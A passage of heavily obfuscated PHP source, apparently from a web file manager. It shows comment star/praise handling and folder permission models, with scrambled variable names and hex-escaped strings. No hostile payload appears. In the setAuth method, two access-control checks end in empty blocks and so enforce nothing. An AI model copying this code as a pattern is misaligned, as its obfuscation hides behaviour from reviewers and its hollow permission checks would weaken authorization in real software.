($û›«¿¤) { $ÉãÔıÎ[$èíæÅÎ¸[1771]] = $û›«¿¤; } $‹Î¡â½ = $this->field($÷¼·Èë)->where($ÉãÔıÎ)->group($èíæÅÎ¸[573])->select(); return array_to_keyvalue($‹Î¡â½, $èíæÅÎ¸[573], $èíæÅÎ¸[569]); } public function starTarget($š´ıçô, $ù”ÙèÜ²) { $Ş¾û¥­ =& $_SERVER[°‰†òö¯]; $Ã’ì‰Ş = $š´ıçô + self::TYPE_STAR_OFFSET; $úğÀœÆ = array($Ş¾û¥­[1771] => USER_ID, $Ş¾û¥­[190] => $Ã’ì‰Ş, $Ş¾û¥­[573] => $ù”ÙèÜ²); $ßÛæ¨‹ = $this->where($úğÀœÆ)->find(); if ($ßÛæ¨‹) { return $this->where(array($Ş¾û¥­[477] => $ßÛæ¨‹[$Ş¾û¥­[477]]))->delete(); } $Åê•¢üğ = array($Ş¾û¥­[2001] => 0, $Ş¾û¥­[1771] => USER_ID, $Ş¾û¥­[811] => 1, $Ş¾û¥­[171] => $Ş¾û¥­[12], $Ş¾û¥­[190] => $Ã’ì‰Ş, $Ş¾û¥­[573] => $ù”ÙèÜ², $Ş¾û¥­[2004] => 0, $Ş¾û¥­[2003] => 0); return $this->add($Åê•¢üğ); } public function starTargetCount($ã„÷¬Ì, $ëÚÓô) { $›´ó´Ä =& $_SERVER[°‰†òö¯]; $¸É–Â®Ö = $ëÚÓô + self::TYPE_STAR_OFFSET; $©ØÁ›ÖÙ = $this->commentCount($ã„÷¬Ì, $¸É–Â®Ö); $Ş½ğŞ¯ = $this->commentCount($ã„÷¬Ì, $¸É–Â®Ö, USER_ID); return array($›´ó´Ä[2006] => $©ØÁ›ÖÙ, $›´ó´Ä[2007] => $Ş½ğŞ¯); } public function starTargetUserList($¹° û, $ÌñÉ™Ô€) { $¸Ôõ‚ää =& $_SERVER[°‰†òö¯]; $¤¼¯‹Å = $¹° û + self::TYPE_STAR_OFFSET; $—íÅªàˆ = array($¸Ôõ‚ää[573] => $ÌñÉ™Ô€, $¸Ôõ‚ää[190] => $¤¼¯‹Å); $ü´¯’ÉÆ = $this->where($—íÅªàˆ)->count(); $·Ü¹¦í™ = array($¸Ôõ‚ää[334] => $ü´¯’ÉÆ, $¸Ôõ‚ää[2008] => array()); if (!$ü´¯’ÉÆ) { return $·Ü¹¦í™; } $½ˆ²ÀÓÈ = $this->field($¸Ôõ‚ää[1771])->where($—íÅªàˆ)->limit(500)->select(); $½ˆ²ÀÓÈ = array_to_keyvalue($½ˆ²ÀÓÈ, $¸Ôõ‚ää[12], $¸Ôõ‚ää[1771]); $·Ü¹¦í™[$¸Ôõ‚ää[2008]] = Model($¸Ôõ‚ää[581])->userListInfo($½ˆ²ÀÓÈ); return $·Ü¹¦í™; } public function prasiseUserList($èõòú¥ê) { $Â‹š¼ŞÜ =& $_SERVER[°‰†òö¯]; $²à´çÚ = array($Â‹š¼ŞÜ[2009] => $èõòú¥ê); $·£íß¼ş = $this->where($²à´çÚ)->find(); $•••òÀ = _get($·£íß¼ş, $Â‹š¼ŞÜ[2004], 0); $”ËÅùí” = array($Â‹š¼ŞÜ[334] => $•••òÀ, $Â‹š¼ŞÜ[2008] => array()); if (!$•••òÀ) { return $”ËÅùí”; } $©Ë³À”Â = Model($Â‹š¼ŞÜ[2010])->field($Â‹š¼ŞÜ[1771])->where($²à´çÚ)->limit(500)->select(); $©Ë³À”Â = array_to_keyvalue($©Ë³À”Â, $Â‹š¼ŞÜ[12], $Â‹š¼ŞÜ[1771]); $”ËÅùí”[$Â‹š¼ŞÜ[2008]] = Model($Â‹š¼ŞÜ[581])->userListInfo($©Ë³À”Â); return $”ËÅùí”; } public function remove($…“‰™Å€) { $ïÉ¤úªÓ =& $_SERVER[°‰†òö¯]; $»³šßæÃ = array($ïÉ¤úªÓ[2002] => $…“‰™Å€); $ùìõş¢ = $this->where($»³šßæÃ)->find(); if ($ùìõş¢[$ïÉ¤úªÓ[2001]]) { $this->where(array($ïÉ¤úªÓ[2002] => $ùìõş¢[$ïÉ¤úªÓ[2001]]))->setAdd($ïÉ¤úªÓ[2003], -1); } return $this->where($»³šßæÃ)->delete(); } public function edit($²í«µœˆ, $îœ²ŒãÒ) { $÷¿¬Ş°Ú =& $_SERVER[°‰†òö¯]; $îÅë—½¤ = array($÷¿¬Ş°Ú[2002] => $²í«µœˆ); return $this->where($îÅë—½¤)->save(array($÷¿¬Ş°Ú[2011] => $îœ²ŒãÒ)); } public function prasise($›¶¤²±±) { $¥Ìœû =& $_SERVER[°‰†òö¯]; $Ğ­“òÌÆ = Model($¥Ìœû[2012]); $Š”üÁ¬ = array($¥Ìœû[2002] => $›¶¤²±±, $¥Ìœû[1762] => USER_ID); $ËĞÎ¥áà = $Ğ­“òÌÆ->where($Š”üÁ¬)->find(); if (!$ËĞÎ¥áà) { $Ğ­“òÌÆ->add($Š”üÁ¬); $˜ì¶¹Æ• = $this->where(array($¥Ìœû[2002] => $›¶¤²±±))->setAdd($¥Ìœû[2004], 1); } else { $Ğ­“òÌÆ->where($Š”üÁ¬)->delete(); $˜ì¶¹Æ• = $this->where(array($¥Ìœû[2002] => $›¶¤²±±))->setAdd($¥Ìœû[2004], -1); } return $˜ì¶¹Æ•; } public function targetInfo($¸„»ôõ§, $¦…Úë»µ) { $¸‹§³úç =& $_SERVER[°‰†òö¯]; $¾¥¬üïà = array($¸‹§³úç[655] => $¸„»ôõ§, $¸‹§³úç[656] => $¦…Úë»µ); $ªŒëİòå = $this->where($¾¥¬üïà)->count(); $ÀÌÌâ§ğ = "\x52\x49\107\x48\124\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\143\157\155\x6d\145\x6e\164\137\160\162\x61\x69\163\145\x20\163\x74\141\162\x20\x6f\x6e\x20\143\x6f\x6d\x6d\x65\x6e\x74\x2e\143\x6f\155\155\145\x6e\x74\x49\x44\40\75\x20\x73\164\141\162\56\143\157\x6d\x6d\145\156\x74\111\x44"; $ãğâ¡ = $this->alias($¸‹§³úç[431])->where($¾¥¬üïà)->join($ÀÌÌâ§ğ, $¸‹§³úç[2013])->count(); $Í±şŠâÙ = array($¸‹§³úç[2014] => $ªŒëİòå, $¸‹§³úç[2015] => $ãğâ¡); return $Í±şŠâÙ; } public function listData($Œ¢Š¼Æó) { $Ÿ÷¸¦š =& $_SERVER[°‰†òö¯]; if (isset($Œ¢Š¼Æó[$Ÿ÷¸¦š[2016]])) { if ($Œ¢Š¼Æó[$Ÿ÷¸¦š[2016]]) { $Œ¢Š¼Æó[$Ÿ÷¸¦š[2009]] = array($Ÿ÷¸¦š[1089], intval($Œ¢Š¼Æó[$Ÿ÷¸¦š[2016]])); } unset($Œ¢Š¼Æó[$Ÿ÷¸¦š[2016]]); } if (isset($Œ¢Š¼Æó[$Ÿ÷¸¦š[2017]])) { if ($Œ¢Š¼Æó[$Ÿ÷¸¦š[2017]]) { $Œ¢Š¼Æó[$Ÿ÷¸¦š[2009]] = array($Ÿ÷¸¦š[1086], intval($Œ¢Š¼Æó[$Ÿ÷¸¦š[2017]])); } unset($Œ¢Š¼Æó[$Ÿ÷¸¦š[2017]]); } return $this->_listData($Œ¢Š¼Æó); } private function _listData($£Æˆ°Ú­) { $ÃÃ÷ê²â =& $_SERVER[°‰†òö¯]; $¦Í£Ûó = $this->where($£Æˆ°Ú­)->_makeOrder()->selectPage(100); $this->_listAppendParent($¦Í£Ûó[$ÃÃ÷ê²â[447]]); $this->_listAppendUser($¦Í£Ûó[$ÃÃ÷ê²â[447]]); $this->_listAppendMeta($¦Í£Ûó[$ÃÃ÷ê²â[447]]); return $¦Í£Ûó; } private function _makeOrder() { $¼š¦Çº =& $_SERVER[°‰†òö¯]; $ŸµÊ¯ƒÈ = array($¼š¦Çº[2004], $¼š¦Çº[2003], $¼š¦Çº[233]); $ùš û–† = Input::get($¼š¦Çº[532], $¼š¦Çº[7], $¼š¦Çº[499], $ŸµÊ¯ƒÈ); $è¥èûÆû = Input::get($¼š¦Çº[533], $¼š¦Çº[7], $¼š¦Çº[1764], array($¼š¦Çº[2018], $¼š¦Çº[528])); $§¸¸Á¨ = $ùš û–† . $¼š¦Çº[53] . $è¥èûÆû; return $this->order($§¸¸Á¨); } private function _listAppendParent(&$“¨©Û¯î) { $³ïïàÌß =& $_SERVER[°‰†òö¯]; $³¿«‰„î = array_unique(array_to_keyvalue($“¨©Û¯î, $³ïïàÌß[12], $³ïïàÌß[2001])); $³¿«‰„î = array_remove_value($³¿«‰„î, $³ïïàÌß[230]); if (!$³¿«‰„î) { return; } $›…¤˜•ö = $this->where(array($³ïïàÌß[2002] => array($³ïïàÌß[7], $³¿«‰„î)))->select(); $›…¤˜•ö = array_to_keyvalue($›…¤˜•ö, $³ïïàÌß[2009]); foreach ($“¨©Û¯î as &$¼¾İ¦İŞ) { if (isset($›…¤˜•ö[$¼¾İ¦İŞ[$³ïïàÌß[2001]]])) { $¼¾İ¦İŞ[$³ïïàÌß[2019]] = $›…¤˜•ö[$¼¾İ¦İŞ[$³ïïàÌß[2001]]]; } } unset($¼¾İ¦İŞ); } private function _listAppendUser(&$£°‘ÄæÒ) { $â‚©Çòé =& $_SERVER[°‰†òö¯]; $–‘·ßÜ = array_unique(array_to_keyvalue($£°‘ÄæÒ, $â‚©Çòé[12], $â‚©Çòé[1771])); $–‘·ßÜ = array_remove_value($–‘·ßÜ, $â‚©Çòé[230]); if (count($–‘·ßÜ) == 0) { return; } foreach ($£°‘ÄæÒ as $‹†›–ª) { if (isset($‹†›–ª[$â‚©Çòé[2019]])) { $–‘·ßÜ[] = $‹†›–ª[$â‚©Çòé[2019]][$â‚©Çòé[1771]]; } } $µì´¦å‹ = Model($â‚©Çòé[601])->userListInfo($–‘·ßÜ); foreach ($£°‘ÄæÒ as &$‹†›–ª) { $‹†›–ª[$â‚©Çòé[669]] = $µì´¦å‹[$‹†›–ª[$â‚©Çòé[1771]]]; if (isset($‹†›–ª[$â‚©Çòé[2019]])) { $‹†›–ª[$â‚©Çòé[2019]][$â‚©Çòé[669]] = $µì´¦å‹[$‹†›–ª[$â‚©Çòé[2019]][$â‚©Çòé[1771]]]; } } unset($‹†›–ª); } private function _listAppendMeta(&$«„´ŒÂÒ) { $¿åÙØ =& $_SERVER[°‰†òö¯]; $•Š»Ÿç = array_unique(array_to_keyvalue($«„´ŒÂÒ, $¿åÙØ[12], $¿åÙØ[2009])); $•Š»Ÿç = array_remove_value($•Š»Ÿç, $¿åÙØ[230]); if (!$•Š»Ÿç) { return; } foreach ($«„´ŒÂÒ as $³ª‡³Ëİ) { if (isset($³ª‡³Ëİ[$¿åÙØ[2019]])) { $•Š»Ÿç[] = $³ª‡³Ëİ[$¿åÙØ[2019]][$¿åÙØ[2009]]; } } $ãÑÕä® = $this->metaList($•Š»Ÿç); if (!$ãÑÕä®) { return !1; } foreach ($«„´ŒÂÒ as &$³ª‡³Ëİ) { $³ª‡³Ëİ[$¿åÙØ[543]] = $ãÑÕä®[$³ª‡³Ëİ[$¿åÙØ[2009]]]; if (isset($³ª‡³Ëİ[$¿åÙØ[2019]])) { $³ª‡³Ëİ[$¿åÙØ[2019]][$¿åÙØ[543]] = $ãÑÕä®[$³ª‡³Ëİ[$¿åÙØ[2019]][$¿åÙØ[2009]]]; } } unset($³ª‡³Ëİ); } private function metaList($ä”üòê) { $ñÎí„¹ˆ =& $_SERVER[°‰†òö¯]; if (!$ä”üòê) { return array(); } $ƒè› ûÖ = array($ñÎí„¹ˆ[2009] => array($ñÎí„¹ˆ[7], $ä”üòê)); $Šï•™à = Model($ñÎí„¹ˆ[2020])->where($ƒè› ûÖ)->select(); $Šï•™à = array_to_keyvalue_group($Šï•™à, $ñÎí„¹ˆ[2009]); foreach ($Šï•™à as $Œ…öÙ²ê => $ìÆòâ—•) { $Íô¡Ÿ€Ç = array(); foreach ($ìÆòâ—• as $€Æ¡û°) { $Íô¡Ÿ€Ç[$€Æ¡û°[$ñÎí„¹ˆ[97]]] = $€Æ¡û°[$ñÎí„¹ˆ[452]]; } $Šï•™à[$Œ…öÙ²ê] = $Íô¡Ÿ€Ç; } return $Šï•™à ? $Šï•™à : array(); } public function removeTarget($¸æÑÌ¬¾, $šîÙ¦‡¡) { $°³èõ±Ş =& $_SERVER[°‰†òö¯]; if (!$šîÙ¦‡¡) { return !0; } $šîÙ¦‡¡ = is_array($šîÙ¦‡¡) ? $šîÙ¦‡¡ : array($šîÙ¦‡¡); $‘Œ¯‘Å = array($°³èõ±Ş[190] => $¸æÑÌ¬¾, $°³èõ±Ş[573] => array($°³èõ±Ş[7], $šîÙ¦‡¡)); $÷©¡ôÏ = $this->field($°³èõ±Ş[2009])->where($‘Œ¯‘Å)->select(); $×ôû‰¦ã = array_to_keyvalue($÷©¡ôÏ, $°³èõ±Ş[12], $°³èõ±Ş[2009]); if (!$×ôû‰¦ã) { return !0; } $‘Œ¯‘Å = array($°³èõ±Ş[2009] => array($°³èõ±Ş[7], $×ôû‰¦ã)); $this->where($‘Œ¯‘Å)->delete(); Model($°³èõ±Ş[2012])->where($‘Œ¯‘Å)->delete(); Model($°³èõ±Ş[2021])->where($‘Œ¯‘Å)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145\x5f\143\157\x6e\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\x69\155\145", "\164\x69\155\x65", "\x69\x6e\163\x65\x72\164", "\146\165\x6e\143\x74\x69\157\156")); } goto C•Ê´Ôˆæ‰; AËŠ¯öÛƒø: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\x65\137\x61\165\x74\x68"; public function getAuth($í•²ø’¸) { $ó‡›ÙôÛ =& $_SERVER[°‰†òö¯]; $œ›·Õìã = $this->sourceAuthSelect($í•²ø’¸); $ëíåß³é = array(); $—•Ÿå‡‡ = array(); $ñƒ§Ÿ¹É = 2 << 25; foreach ($œ›·Õìã as $Õ‘Ğ¦ö†) { $•¥½ƒİÅ = Model($ó‡›ÙôÛ[575])->listData($Õ‘Ğ¦ö†[$ó‡›ÙôÛ[2080]]); if (!$•¥½ƒİÅ) { continue; } $ëíåß³é[] = $Õ‘Ğ¦ö†; $ş‹§Ú¾ = 0; if ($Õ‘Ğ¦ö†[$ó‡›ÙôÛ[190]] == SourceModel::TYPE_GROUP) { $ş‹§Ú¾ = $ñƒ§Ÿ¹É * 2; } if ($Õ‘Ğ¦ö†[$ó‡›ÙôÛ[190]] == SourceModel::TYPE_USER) { $ş‹§Ú¾ = $ñƒ§Ÿ¹É; } if ($Õ‘Ğ¦ö†[$ó‡›ÙôÛ[190]] == SourceModel::TYPE_USER && $Õ‘Ğ¦ö†[$ó‡›ÙôÛ[573]] == $ó‡›ÙôÛ[230]) { $ş‹§Ú¾ = 0; } $—•Ÿå‡‡[] = $•¥½ƒİÅ[$ó‡›ÙôÛ[489]] + $ş‹§Ú¾; } array_multisort($—•Ÿå‡‡, SORT_DESC, $ëíåß³é); return $ëíåß³é; } public function sourceAuthSelect($ó’Û×Íß) { $¬§¸Á–¾ =& $_SERVER[°‰†òö¯]; static $®ÖÌğâÈ = array(); $êÄ±®¶  = is_array($ó’Û×Íß) ? !1 : !0; if ($êÄ±®¶ ) { $ó’Û×Íß = array($ó’Û×Íß); } $çîä·È® = array(); foreach ($ó’Û×Íß as $û¬¶é) { if (isset($®ÖÌğâÈ[$û¬¶é])) { $çîä·È®[$û¬¶é] = $®ÖÌğâÈ[$û¬¶é]; } } if (count($çîä·È®) == count($ó’Û×Íß)) { return $êÄ±®¶  ? $çîä·È®[$ó’Û×Íß[0]] : $çîä·È®; } $ßµ”‹“¾ = $¬§¸Á–¾[2161]; $‘ÊÙ• = array($¬§¸Á–¾[193] => array($¬§¸Á–¾[7], $ó’Û×Íß)); $É¿ğƒ–‰ = $this->field($ßµ”‹“¾)->order($¬§¸Á–¾[477])->where($‘ÊÙ•)->select(); $·İ°Ê½à = array_to_keyvalue_group($É¿ğƒ–‰, $¬§¸Á–¾[193]); foreach ($ó’Û×Íß as $û¬¶é) { $®ÖÌğâÈ[$û¬¶é] = $·İ°Ê½à[$û¬¶é] ? $·İ°Ê½à[$û¬¶é] : array(); } if ($êÄ±®¶ ) { return $É¿ğƒ–‰; } return $·İ°Ê½à; } public function setAuth($Â…£â , $Ö·îş§) { $ß©”ú· =& $_SERVER[°‰†òö¯]; $ò›²®° = Model($ß©”ú·[1419])->sourceInfo($Â…£â ); if (!$ò›²®°) { return !1; } if ($ò›²®°[$ß©”ú·[190]] != SourceModel::TYPE_GROUP) { return !1; } $ÇÇŒ¶İ˜ = 1; $Å¦ÎòêÑ = $ò›²®°[$ß©”ú·[573]]; if ($Å¦ÎòêÑ != $ÇÇŒ¶İ˜) { $™µ­ºì = array($ß©”ú·[1972] => $Å¦ÎòêÑ); $Ä«Êœì¾ = Model($ß©”ú·[2066])->field($ß©”ú·[1771])->where($™µ­ºì)->select(); $Ä«Êœì¾ = array_to_keyvalue($Ä«Êœì¾, $ß©”ú·[12], $ß©”ú·[1771]); } $ÌÜ ŸËĞ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $üÙÄşÓ‡ = array(); foreach ($Ö·îş§ as $Š†Š‰ßÅ) { if (!in_array($Š†Š‰ßÅ[$ß©”ú·[190]], $ÌÜ ŸËĞ)) { show_json(LNG($ß©”ú·[2162]), !1); } if ($Å¦ÎòêÑ != $ÇÇŒ¶İ˜) { if ($Š†Š‰ßÅ[$ß©”ú·[190]] == SourceModel::TYPE_GROUP) { } if ($Š†Š‰ßÅ[$ß©”ú·[573]] != 0 && !in_array($Š†Š‰ßÅ[$ß©”ú·[573]], $Ä«Êœì¾)) { } } if ($Š†Š‰ßÅ[$ß©”ú·[573]] == 0) { $Š†Š‰ßÅ[$ß©”ú·[190]] = SourceModel::TYPE_USER; } $üÙÄşÓ‡[] = array($ß©”ú·[193] => $Â…£â , $ß©”ú·[190] => intval($Š†Š‰ßÅ[$ß©”ú·[190]]), $ß©”ú·[573] => intval($Š†Š‰ßÅ[$ß©”ú·[573]]), $ß©”ú·[2080] => intval($Š†Š‰ßÅ[$ß©”ú·[2080]]) ? intval($Š†Š‰ßÅ[$ß©”ú·[2080]]) : 0, $ß©”ú·[2144] => intval($Š†Š‰ßÅ[$ß©”ú·[2144]]) ? intval($Š†Š‰ßÅ[$ß©”ú·[2144]]) : -1); } $this->where(array($ß©”ú·[493] => $Â…£â ))->delete(); $this->addAll($üÙÄşÓ‡); return !0; } public function authClear($««ÀàØê) { $“‰Ä¦ˆ¨ =& $_SERVER[°‰†òö¯]; $Ù¹şèÄ¯ = Model($“‰Ä¦ˆ¨[1419])->sourceInfo($««ÀàØê); $¦ÉË¢‹Æ = array($««ÀàØê); if ($Ù¹şèÄ¯[$“‰Ä¦ˆ¨[487]] == $“‰Ä¦ˆ¨[91]) { $´°ŸÇõ = array($“‰Ä¦ˆ¨[659] => array($“‰Ä¦ˆ¨[619], $Ù¹şèÄ¯[$“‰Ä¦ˆ¨[588]] . $««ÀàØê . $“‰Ä¦ˆ¨[620])); $¦ÉË¢‹Æ = Model($“‰Ä¦ˆ¨[1419])->field($“‰Ä¦ˆ¨[493])->where($´°ŸÇõ)->getField($“‰Ä¦ˆ¨[193], !0); $¦ÉË¢‹Æ[] = $««ÀàØê; } $this->where(array($“‰Ä¦ˆ¨[493] => array($“‰Ä¦ˆ¨[494], $¦ÉË¢‹Æ)))->delete(); return !0; } public function getAllChildren($ü—§¶“Ü) { $¼úÜˆÇö =& $_SERVER[°‰†òö¯]; $›Îúêñ² = Model($¼úÜˆÇö[1419])->sourceInfo($ü—§¶“Ü); if ($›Îúêñ²[$¼úÜˆÇö[487]] != $¼úÜˆÇö[91]) { return $this->sourceListAuth(array($ü—§¶“Ü)); } if ($›Îúêñ²[$¼úÜˆÇö[190]] != SourceModel::TYPE_GROUP) { return array(); } $áâúóïÁ = 1; $ßË½¢Ö„ = array($ü—§¶“Ü); if ($›Îúêñ²[$¼úÜˆÇö[192]] == $¼úÜˆÇö[230] && $›Îúêñ²[$¼úÜˆÇö[573]] != $áâúóïÁ) { $ßË½¢Ö„ = $this->groupChidldAllRootSource($›Îúêñ²[$¼úÜˆÇö[573]]); } $¡•†Š˜ = $this->field($¼úÜˆÇö[193])->group($¼úÜˆÇö[193])->select(); $¡•†Š˜ = array_to_keyvalue($¡•†Š˜, $¼úÜˆÇö[12], $¼úÜˆÇö[193]); if (!$¡•†Š˜) { return array(); } $©ß™¼Ğ¥ = $¼úÜˆÇö[2163]; $‚áÇÓ¯˜ = array($¼úÜˆÇö[193] => array($¼úÜˆÇö[7], $¡•†Š˜), $¼úÜˆÇö[507] => $¼úÜˆÇö[230]); $€©ËÖÓŞ = Model($¼úÜˆÇö[891])->field($©ß™¼Ğ¥)->where($‚áÇÓ¯˜)->select(); $ªÁÖûÒµ = array($ü—§¶“Ü); foreach ($€©ËÖÓŞ as $«¸Å©î) { foreach ($ßË½¢Ö„ as $ú£¥†ß“) { $ªäÌŞèË = $¼úÜˆÇö[50] . $ú£¥†ß“ . $¼úÜˆÇö[50]; $¢â£Ù = $«¸Å©î[$¼úÜˆÇö[588]] . $«¸Å©î[$¼úÜˆÇö[193]] . $¼úÜˆÇö[50]; if (strstr($¢â£Ù, $ªäÌŞèË)) { $ªÁÖûÒµ[] = $«¸Å©î[$¼úÜˆÇö[193]]; break; } } } return $this->sourceListAuth($ªÁÖûÒµ); } private function sourceListAuth($°ÉûÕÌ¨) { $Íà´û¸ï =& $_SERVER[°‰†òö¯]; $çˆù”Áé = Model($Íà´û¸ï[1419])->sourceListInfo($°ÉûÕÌ¨, !0); $——‹¡È = $this->sourceAuthSelect($°ÉûÕÌ¨); $ÆÒº©¾² = array(); $’Ş«¼ì‘ = array(); foreach ($çˆù”Áé as $ş‰¾“Óé) { unset($ş‰¾“Óé[$Íà´û¸ï[531]]); unset($ş‰¾“Óé[$Íà´û¸ï[529]]); unset($ş‰¾“Óé[$Íà´û¸ï[489]]); unset($ş‰¾“Óé[$Íà´û¸ï[90]]); $™Çß‘æÒ = $——‹¡È[$ş‰¾“Óé[$Íà´û¸ï[193]]]; if (!$™Çß‘æÒ) { continue; } $ş‰¾“Óé[$Íà´û¸ï[2164]] = $this->authTargetInfo($™Çß‘æÒ); $ş‰¾“Óé[$Íà´û¸ï[586]] = rtrim($ş‰¾“Óé[$Íà´û¸ï[592]], $Íà´û¸ï[8]) . $Íà´û¸ï[8] . ltrim($ş‰¾“Óé[$Íà´û¸ï[586]], $Íà´û¸ï[8]); $ÆÒº©¾²[] = $ş‰¾“Óé; $‹æ¼ãÕ’ = count(explode($Íà´û¸ï[8], trim($ş‰¾“Óé[$Íà´û¸ï[586]], $Íà´û¸ï[8]))); $’Ş«¼ì‘[] = $‹æ¼ãÕ’ + ($ş‰¾“Óé[$Íà´û¸ï[33]] == $Íà´û¸ï[78] ? 0 : 1000); } array_multisort($’Ş«¼ì‘, SORT_ASC, $ÆÒº©¾²); return $ÆÒº©¾²; } private function groupChidldAllRootSource($Ó„±ü) { $¯‹„ô =& $_SERVER[°‰†òö¯]; $œ¤ê ’ö = Model($¯‹„ô[2165])->groupChildrenAll($Ó„±ü); $ß²Æ¼Æ« = array($¯‹„ô[192] => 0, $¯‹„ô[573] => array($¯‹„ô[7], $œ¤ê ’ö), $¯‹„ô[190] => SourceModel::TYPE_GROUP); $½€ÒËÙ = Model($¯‹„ô[891])->field($¯‹„ô[193])->where($ß²Æ¼Æ«)->select(); $½€ÒËÙ = array_to_keyvalue($½€ÒËÙ, $¯‹„ô[12], $¯‹„ô[193]); return $½€ÒËÙ; } private function authTargetInfo($œ˜£Š”ú) { $°˜…ˆÇŠ =& $_SERVER[°‰†òö¯]; $¹Š»ˆËÂ = array(); $µÙÒ€ö• = array(); $££æ¨­° = 2 << 25; foreach ($œ˜£Š”ú as $İÅï¶ÇÎ) { $äãĞš²Â = Model($°˜…ˆÇŠ[575])->listData($İÅï¶ÇÎ[$°˜…ˆÇŠ[2080]]); if (!$äãĞš²Â) { continue; } if ($İÅï¶ÇÎ[$°˜…ˆÇŠ[190]] == SourceModel::TYPE_USER) { $ò¦µ“˜Í = Model($°˜…ˆÇŠ[581])->getInfoSimpleOuter($İÅï¶ÇÎ[$°˜…ˆÇŠ[573]]); if ($ò¦µ“˜Í[$°˜…ˆÇŠ[1771]] == $°˜…ˆÇŠ[1271]) { continue; } if ($ò¦µ“˜Í[$°˜…ˆÇŠ[1771]] == $°˜…ˆÇŠ[230]) { $ò¦µ“˜Í[$°˜…ˆÇŠ[32]] = LNG($°˜…ˆÇŠ[2166]); } } else { $ò¦µ“˜Í = Model($°˜…ˆÇŠ[589])->getInfoSimple($İÅï¶ÇÎ[$°˜…ˆÇŠ[573]]); } if (!$ò¦µ“˜Í) { continue; } $ò¦µ“˜Í[$°˜…ˆÇŠ[544]] = $äãĞš²Â; $¹Š»ˆËÂ[] = $ò¦µ“˜Í; $ø·èÑú = 0; if ($İÅï¶ÇÎ[$°˜…ˆÇŠ[190]] == SourceModel::TYPE_GROUP) { $ø·èÑú = $££æ¨­° * 2; } if ($İÅï¶ÇÎ[$°˜…ˆÇŠ[190]] == SourceModel::TYPE_USER) { $ø·èÑú = $££æ¨­°; } if ($İÅï¶ÇÎ[$°˜…ˆÇŠ[190]] == SourceModel::TYPE_USER && $İÅï¶ÇÎ[$°˜…ˆÇŠ[573]] == $°˜…ˆÇŠ[230]) { $ø·èÑú = 0; } $µÙÒ€ö•[] = $äãĞš²Â[$°˜…ˆÇŠ[489]] + $ø·èÑú; } array_multisort($µÙÒ€ö•, SORT_DESC, $¹Š»ˆËÂ); return $¹Š»ˆËÂ; } public function getAllChildrenByUser($œš“Œãá, $ë¶¶ìõ“) { $õØ¦¬°™ =& $_SERVER[°‰†òö¯]; $²¾¸´ßü = Model($õØ¦¬°™[601])->getInfo($ë¶¶ìõ“); if (!$ë¶¶ìõ“ || !$œš“Œãá || !$²¾¸´ßü) { return array(); } $Àã£‹Ø¢ = Model($õØ¦¬°™[1419])->sourceInfo($œš“Œãá); $§ùÓ½ì× = array(); $…Î—å—ú = 1; if ($Àã£‹Ø¢[$õØ¦¬°™[192]] == $õØ¦¬°™[230] && $Àã£‹Ø¢[$õØ¦¬°™[573]] != $…Î—å—ú && $this->groupContainUser($Àã£‹Ø¢[$õØ¦¬°™[573]], $ë¶¶ìõ“)) { foreach ($²¾¸´ßü[$õØ¦¬°™[2167]] as $µÏÃÏœ¤) { $Ş¶öŞé = Model($õØ¦¬°™[589])->getInfo($µÏÃÏœ¤[$õØ¦¬°™[1972]]); $È¸ó£ğø = Model($õØ¦¬°™[601])->getInfoSimpleOuter($ë¶¶ìõ“); $È¸ó£ğø[$õØ¦¬°™[544]] = $µÏÃÏœ¤[$õØ¦¬°™[489]]; if (Model($õØ¦¬°™[575])->authCheckAction($µÏÃÏœ¤[$õØ¦¬°™[489]][$õØ¦¬°™[489]], $õØ¦¬°™[1993])) { continue; } $Ù¼¡¿•Ê = array($õØ¦¬°™[32] => $õØ¦¬°™[1291] . $Ş¶öŞé[$õØ¦¬°™[32]], $õØ¦¬°™[193] => $Ş¶öŞé[$õØ¦¬°™[90]][$õØ¦¬°™[193]], $õØ¦¬°™[87] => KodIO::make($Ş¶öŞé[$õØ¦¬°™[90]][$õØ¦¬°™[193]]), $õØ¦¬°™[192] => $õØ¦¬°™[230], $õØ¦¬°™[190] => $õØ¦¬°™[582], $õØ¦¬°™[33] => $õØ¦¬°™[623], $õØ¦¬°™[586] => $Ş¶öŞé[$õØ¦¬°™[593]], $õØ¦¬°™[1972] => $Ş¶öŞé[$õØ¦¬°™[1972]], $õØ¦¬°™[590] => $Ş¶öŞé[$õØ¦¬°™[192]], $õØ¦¬°™[2164] => array($È¸ó£ğø)); $§ùÓ½ì×[$Ù¼¡¿•Ê[$õØ¦¬°™[193]]] = $Ù¼¡¿•Ê; } } $‘ºÀ®”¹ = array(); $Ñí£ó™É = $this->getAllChildren($œš“Œãá); foreach ($Ñí£ó™É as $ìÂ™‰´) { $’°áêŸ¹ = !1; foreach ($ìÂ™‰´[$õØ¦¬°™[2164]] as $• Ùæ¤÷) { if ($• Ùæ¤÷[$õØ¦¬°™[1771]]) { if ($• Ùæ¤÷[$õØ¦¬°™[1771]] == $ë¶¶ìõ“) { $’°áêŸ¹ = !0; break; } } if ($• Ùæ¤÷[$õØ¦¬°™[1972]]) { if ($this->groupContainUser($• Ùæ¤÷[$õØ¦¬°™[1972]], $ë¶¶ìõ“)) { $’°áêŸ¹ = !0; break; } } } if ($’°áêŸ¹) { $‘ºÀ®”¹[] = $ìÂ™‰´; } $–Æ£†ÚÎ = $ìÂ™‰´[$õØ¦¬°™[193]]; if (isset($§ùÓ½ì×[$–Æ£†ÚÎ])) { $ìÂ™‰´[$õØ¦¬°™[2164]][] = $§ùÓ½ì×[$–Æ£†ÚÎ][0]; $§ùÓ½ì×[$–Æ£†ÚÎ] = !1; } } $§ùÓ½ì× = array_filter(array_values($§ùÓ½ì×)); $‘ºÀ®”¹ = array_merge($§ùÓ½ì×, $‘ºÀ®”¹); return $‘ºÀ®”¹; } public function setAllChildrenByUser($µ¨ìÉö±, $ÈÓ»Áµ°, $¨ÓÅ¤ÜË) { $¡¡‚¸ßÉ =& $_SERVER[°‰†òö¯]; $Õ´ÀóŒ± = $this->getAllChildrenByUser($µ¨ìÉö±, $ÈÓ»Áµ°); if (!$¨ÓÅ¤ÜË || !$Õ´ÀóŒ±) { return !1; } foreach ($Õ´ÀóŒ± as $µçÖ¹†) { $‘ûşâ±İ = array(); foreach 